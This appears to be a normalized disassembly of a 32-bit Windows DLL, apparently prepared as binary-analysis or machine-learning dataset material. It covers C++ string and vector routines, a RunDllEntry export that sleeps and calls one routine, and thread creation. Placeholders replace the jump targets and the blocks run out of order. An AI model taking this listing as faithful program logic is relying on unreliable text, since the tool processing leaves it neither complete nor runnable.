sub_10001012
push esi
push 0x0
push [ esp + 0xc ]
mov esi eax
call sub_10027160
pop ecx
push eax
mov ecx esi
call sub_1000133e
cmp [ esi + 0x18 ] 0x10
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push [ esp + 0x8 ]
push esi
call sub_100271f0
pop ecx
pop ecx
pop esi
retn
sub_10001045
push 0x24
mov eax sub_10050b87
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x10 ] ebx
call sub_100026a3
xor edi edi
mov [ ebp - 0x4 ] ebx
inc edi
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] edi
call sub_10001362
lea ecx [ ebp - 0x2c ]
lea eax [ esi + 0x70 ]
push ecx
mov [ ebp - 0x4 ] edi
call sub_10001443
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
lea eax [ ebp - 0x2c ]
push eax
lea eax [ esi + 0x70 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001443
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
lea eax [ ebp - 0x2c ]
push eax
lea eax [ esi + 0x70 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001443
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push r--data
lea eax [ esi + 0x88 ]
call sub_10001012
lea eax [ esi + 0x54 ]
mov [ esp ] r--data
call sub_10001012
lea eax [ esi + 0x38 ]
mov [ esp ] r--data
call sub_10001012
lea ecx [ esi + 0x18 ]
mov [ esi + 0x34 ] 0x36ee80
mov [ esp ] r--data
call sub_100014f8
mov eax esi
call sub_1002b37e
retn
sub_1000113a
push 0x0
mov eax sub_10050b3b
call sub_1002b2a6
mov edi ecx
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10001384
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_100025cf
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
lea eax [ edi + 0x38 ]
push eax
lea ecx [ esi + 0x38 ]
call sub_10002255
lea eax [ edi + 0x54 ]
push eax
lea ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_10002255
lea eax [ edi + 0x70 ]
push eax
lea eax [ esi + 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10001384
add edi 0x88
push edi
lea ecx [ esi + 0x88 ]
mov [ ebp - 0x4 ] 0x4
call sub_10002255
mov eax esi
call sub_1002b37e
retn 0x4
sub_100011c9
push ebp
sub esp 0xa4
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xa4 ] eax
push 0x28
mov eax sub_1005222b
call sub_1002b2a6
xor edi edi
lea esi [ ebp ]
mov [ ebp - 0x10 ] edi
call sub_10001045
push 0x148
mov [ ebp - 0x4 ] edi
call sub_1002738b
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] bl
cmp eax edi
je r-xdata
xor eax eax
push r--data
lea ecx [ ebp - 0x34 ]
call sub_10001362
lea eax [ ebp - 0x34 ]
push eax
mov eax esi
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
call sub_100082bc
jmp r-xdata
mov esi [ Sleep@IAT ]
push 0x3e8
jmp r-xdata
push edi
push ebx
lea ecx [ ebp - 0x34 ]
call sub_1000264e
mov [ rw-data ] eax
test [ ebp - 0x10 ] bl
je r-xdata
call esi
mov al [ rw-data ]
test al al
je r-xdata
push ebx
lea eax [ ebp - 0x18 ]
push eax
push edi
push edi
push sub_100011b9
push edi
push edi
call [ CreateThread@IAT ]
lea edi [ ebp ]
call sub_100026f6
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xa4 ]
xor ecx ebp
call sub_10027150
add ebp 0xa8
leave
retn 0x4
sub_100012ab
push 0x48
mov eax sub_100529c8
call sub_1002b2a6
xor esi esi
lea eax [ ebp - 0x10 ]
push eax
push esi
push esi
push sub_100011c9
push esi
push esi
mov [ ebp - 0x10 ] esi
call [ CreateThread@IAT ]
cmp eax esi
jne r-xdata
call sub_1002b37e
retn
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] esi
call sub_10001eec
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_1002ae74
RunDllEntry
push esi
mov esi [ Sleep@IAT ]
mov [ rw-data ] 0x0
push 0x64
call esi
push 0x64
mov [ rw-data ] 0x1
call esi
push [ rw-data ]
call sub_100149a9
push 0x4e20
call esi
pop esi
retn
sub_1000133e
mov edx [ ecx + 0x14 ]
mov eax [ esp + 0x4 ]
cmp eax edx
ja r-xdata
push [ esp + 0x8 ]
sub eax edx
push eax
call sub_100014aa
push 0xffffffff
push eax
call sub_10001f47
jmp r-xdata
retn 0x8
sub_10001384
push 0x14
mov eax sub_10050aec
call sub_1002b2d9
xor ebx ebx
push ebx
push 0x1
call sub_10001bf4
mov edi [ ebp + 0x8 ]
pop ecx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov eax edi
call sub_1002b37e
retn 0x8
call sub_10001593
cmp al bl
je r-xdata
mov [ edi ] eax
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov ebx [ esi + 0x10 ]
mov edi esi
lea esi [ ebp - 0x18 ]
call sub_1000986e
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x20 ]
call sub_1000986e
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
xor eax eax
lea edi [ ebp + 0xc ]
stosb [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ecx
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
call sub_10006dd4
add esp 0x10
mov [ esi + 0x10 ] eax
mov edi esi
sub_10001443
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ecx [ edi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop esi
idiv esi
mov esi eax
xor esi esi
jmp r-xdata
lea esi [ ebp - 0xc ]
call sub_1000986e
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
push eax
mov eax edi
call sub_10001515
push [ ebp + 0x8 ]
push 0x1
push ebx
call sub_100015ef
mov [ edi + 0x10 ] eax
jmp r-xdata
mov ebx [ edi + 0x10 ]
mov eax ebx
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
cmp eax esi
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_100014aa
push ebx
mov ebx [ esp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_10021cc4
mov eax edi
pop edi
pop ebx
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_1000212d
test al al
je r-xdata
pop esi
push [ esp + 0x14 ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_1000161f
push esi
mov ecx edi
call sub_100021a7
sub_10001515
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ebx
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
jne r-xdata
lea esi [ ebp - 0x8 ]
call sub_1000986e
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] eax
jmp r-xdata
call sub_10027827
cmp eax [ ebp - 0x8 ]
je r-xdata
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
call sub_100016db
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_1000986e
push [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_10001946
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x10
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x4 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov [ ebp - 0x4 ] eax
sub_10001593
push esi
mov esi eax
cmp esi 0x9249249
jbe r-xdata
test esi esi
ja r-xdata
call sub_100155d9
mov ecx esi
call sub_10001a37
push 0x0
call sub_1002738b
pop ecx
jmp r-xdata
imul esi esi 0x1c
add esi eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] esi
mov al 0x1
pop esi
retn
sub_100015ef
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001a7a
mov eax [ ebp + 0xc ]
imul eax eax 0x1c
add esp 0x14
add eax [ ebp + 0x8 ]
pop edi
leave
retn 0xc
sub_1000161f
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
add ecx eax
push ecx
call sub_10001d84
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + eax ] dl
jmp r-xdata
sub_10001667
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10001d48
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_100024cd
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_1000253c
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_10002614
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_10002630
sub_100016db
push 0x54
mov eax sub_10050abf
call sub_1002b345
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0xc ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] eax
test ecx ecx
jne r-xdata
mov eax [ esi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop ebx
idiv ebx
mov ebx eax
xor ebx ebx
jmp r-xdata
call sub_1002b3a1
retn 0x10
mov eax [ esi + 0x10 ]
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
mov ecx 0x9249249
mov edx ecx
sub edx eax
cmp edx edi
jae r-xdata
test edi edi
je r-xdata
add eax edi
cmp ebx eax
jae r-xdata
call sub_100155d9
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
cmp eax edi
jae r-xdata
mov edx ebx
shr edx 0x1
sub ecx edx
cmp ecx ebx
jae r-xdata
lea ecx [ ebp - 0x4c ]
call sub_100025cf
imul edi edi 0x1c
mov [ ebp - 0x4 ] 0x5
mov ebx [ esi + 0x10 ]
mov ecx ebx
sub ecx edi
push ebx
mov edx ebx
mov [ ebp - 0x58 ] ecx
call sub_100019ba
push [ ebp + 0x14 ]
mov ecx [ ebp - 0x58 ]
mov [ esi + 0x10 ] eax
mov eax ebx
call sub_100019fa
pop ecx
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp + 0x14 ]
add edi eax
push edi
call sub_100019db
pop ecx
pop ecx
lea ecx [ ebp - 0x4c ]
lea ecx [ ebp - 0x30 ]
call sub_100025cf
mov ebx edi
imul ebx ebx 0x1c
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x14 ]
push [ esi + 0x10 ]
lea edx [ ebx + ecx ]
call sub_100019ba
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x1c
pop ecx
cdq
idiv ecx
sub edi eax
push edi
push [ esi + 0x10 ]
call sub_100015ef
mov [ ebp - 0x4 ] 0x2
add [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x14 ]
sub esi ebx
push esi
call sub_100019db
pop ecx
pop ecx
lea ecx [ ebp - 0x30 ]
jmp r-xdata
add ebx edx
xor ebx ebx
jmp r-xdata
push 0x0
push 0x1
call sub_1000264e
test ebx ebx
ja r-xdata
mov ebx eax
cmp ebx eax
jae r-xdata
mov ecx ebx
call sub_10001a37
push 0x0
call sub_1002738b
pop ecx
jmp r-xdata
mov eax [ ebp - 0x50 ]
imul ebx ebx 0x1c
imul edi edi 0x1c
add ebx eax
add edi eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0xc ] eax
jmp r-xdata
push [ esi + 0x10 ]
call sub_100139b7
push [ esi + 0xc ]
call sub_100272e8
pop ecx
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x14 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
and [ ebp - 0x4 ] 0x0
push edi
mov [ ebp - 0x54 ] eax
imul eax eax 0x1c
add eax [ ebp - 0x50 ]
push eax
call sub_100015ef
push [ ebp + 0x14 ]
mov edx [ ebp - 0x50 ]
mov ecx [ esi + 0xc ]
mov [ ebp - 0x5c ] 0x1
call sub_100019ba
mov eax [ ebp - 0x54 ]
push [ esi + 0x10 ]
mov ecx [ ebp + 0x14 ]
lea edx [ eax + edi ]
imul edx edx 0x1c
add edx [ ebp - 0x50 ]
mov [ ebp - 0x5c ] 0x2
call sub_100019ba
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
sub eax ecx
cdq
push 0x1c
pop ecx
idiv ecx
add edi eax
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
sub_10001807
cmp [ ebp - 0x5c ] 0x1
jle r-xdata
xor esi esi
cmp [ ebp - 0x5c ] esi
jle r-xdata
mov ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x50 ]
imul ecx ecx 0x1c
add ecx eax
push ecx
call sub_100139b7
push [ ebp - 0x50 ]
call sub_100272e8
pop ecx
push esi
push esi
call sub_1002ae74
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
cmp eax edi
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
imul eax eax 0x1c
add eax [ ebp - 0x50 ]
imul ecx ecx 0x1c
add ecx [ ebp - 0x50 ]
push ecx
call sub_100139b7
lea ecx [ ebp - 0x4c ]
call sub_100025cf
imul edi edi 0x1c
mov [ ebp - 0x4 ] 0x5
mov ebx [ esi + 0x10 ]
mov ecx ebx
sub ecx edi
push ebx
mov edx ebx
mov [ ebp - 0x58 ] ecx
call sub_100019ba
push [ ebp + 0x14 ]
mov ecx [ ebp - 0x58 ]
mov [ esi + 0x10 ] eax
mov eax ebx
call sub_100019fa
pop ecx
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp + 0x14 ]
add edi eax
push edi
call sub_100019db
pop ecx
pop ecx
lea ecx [ ebp - 0x4c ]
lea ecx [ ebp - 0x30 ]
call sub_100025cf
mov ebx edi
imul ebx ebx 0x1c
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x14 ]
push [ esi + 0x10 ]
lea edx [ ebx + ecx ]
call sub_100019ba
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x1c
pop ecx
cdq
idiv ecx
sub edi eax
push edi
push [ esi + 0x10 ]
call sub_100015ef
mov [ ebp - 0x4 ] 0x2
add [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x14 ]
sub esi ebx
push esi
call sub_100019db
pop ecx
pop ecx
lea ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x0
push 0x1
call sub_1000264e
call sub_1002b3a1
retn 0x10
sub_10001946
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push edi
push [ ebp + 0x8 ]
lea edi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_10001974
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
pop edi
leave
retn 0x4
sub_10001974
mov eax [ edi ]
test eax eax
jne r-xdata
mov edx [ eax ]
jmp r-xdata
call sub_10027827
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ edi + 0x4 ]
push esi
mov esi [ esp + 0x8 ]
imul esi esi 0x1c
add ecx esi
cmp ecx [ edx + 0x10 ]
ja r-xdata
xor edx edx
call sub_10027827
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
add [ edi + 0x4 ] esi
mov eax edi
pop esi
retn 0x4
cmp ecx [ eax + 0xc ]
jae r-xdata
sub_100019ba
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_10001ad0
add esp 0xc
pop edi
leave
retn 0x4
sub_100019db
push esi
mov esi eax
jmp r-xdata
cmp esi [ esp + 0x8 ]
jne r-xdata
push 0xffffffff
push 0x0
push [ esp + 0x14 ]
mov ecx esi
call sub_1000253c
add esi 0x1c
pop esi
retn
sub_100019fa
push ebx
push esi
mov ebx eax
push edi
mov edi ecx
mov eax edi
sub eax [ esp + 0x10 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov esi ebx
imul eax eax 0x1c
sub esi eax
cmp [ esp + 0x10 ] edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn
sub ebx edi
sub edi 0x1c
lea eax [ ebx + edi ]
push eax
mov ecx edi
call sub_10001b7e
pop ecx
cmp edi [ esp + 0x10 ]
jne r-xdata
sub_10001a37
push ebp
mov ebp esp
or eax 0xffffffff
xor edx edx
div ecx
sub esp 0x10
cmp eax 0x1c
jae r-xdata
imul ecx ecx 0x1c
push ecx
call sub_1002738b
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_10027401
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_1002ae74
sub_10001a7a
push 0x8
mov eax sub_10050630
call sub_1002b2d9
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
call sub_1002b37e
retn
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
call sub_10001b56
dec [ ebp + 0xc ]
add [ ebp + 0x8 ] 0x1c
pop ecx
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
sub_10001aab
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x1
mov ecx esi
call sub_1000264e
add esi 0x1c
push 0x0
call sub_1002ae74
call sub_1002b37e
retn
sub_10001ad0
push 0x2c
mov eax sub_10050a8a
call sub_1002b345
mov esi edx
xor ebx ebx
mov edi ecx
push ebx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x18 ] 0x7
call sub_10002630
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
mov eax esi
call sub_1002b3a1
retn
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10001b56
pop ecx
push esi
mov ecx edi
call sub_10001b7e
add esi 0x1c
pop ecx
mov [ ebp - 0x34 ] esi
add edi 0x1c
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_10001b24
mov esi [ ebp - 0x38 ]
jmp r-xdata
push 0x0
cmp esi [ ebp - 0x34 ]
jne r-xdata
push 0x1
mov ecx esi
call sub_1000264e
add esi 0x1c
push 0x0
call sub_1002ae74
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
mov eax esi
call sub_1002b3a1
retn
sub_10001b7e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn
push ebx
push esi
push edi
lea edx [ eax + 0x4 ]
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ebx [ ecx + 0x4 ]
mov edi edx
mov esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi ebx
lea esi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ecx + 0x14 ]
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ ecx + 0x14 ] edx
mov edx [ eax + 0x18 ]
pop edi
mov [ eax + 0x18 ] esi
pop esi
mov [ ecx + 0x18 ] edx
pop ebx
sub_10001bf4
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x4
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x2
push eax
call sub_1002738b
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10027401
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1002ae74
int3
sub_10001c66
push 0x4
mov eax sub_1004fe0e
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10027471
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10002255
mov eax esi
call sub_1002b37e
retn 0x4
sub_10001ca0
push 0x4
mov eax sub_1004fe0e
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_100273f0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10002255
mov eax esi
call sub_1002b37e
retn 0x4
sub_10001d48
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x8
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_10001db8
push 0x4
mov eax sub_1004fe0e
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10027471
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10002255
mov eax esi
call sub_1002b37e
retn 0x4
sub_10001df2
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x10
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x10
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
add ecx eax
cmp ecx [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_10001e2d
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10001df2
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_1000212d
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_100021c3
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_1000218b
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_100021a7
sub_10001eec
push 0x4
mov eax sub_1004fe0e
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_100273f0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10002255
mov eax esi
call sub_1002b37e
retn 0x4
sub_10001f47
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_10021cfc
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ebx edx
mov ebx [ edx ]
jmp r-xdata
sub eax [ ebp + 0xc ]
add ebx edi
add ebx [ ebp + 0xc ]
push eax
push ebx
sub ecx edi
push ecx
add edx edi
push edx
call sub_10001f2b
mov eax [ esi + 0x14 ]
sub eax [ ebp + 0xc ]
add esp 0x10
push eax
mov ecx esi
call sub_100021a7
pop ebx
mov edx [ edx ]
cmp ecx 0x10
jb r-xdata
sub_10001fb6
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_1002738b
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10027401
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1002ae74
int3
sub_10002000
push 0xc
mov eax sub_1004fb75
call sub_1002b2d9
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push 0x0
push eax
call sub_10001fb6
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
push 0xfffffffe
pop eax
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_100020e2
push [ ebp + 0xc ]
mov ecx edi
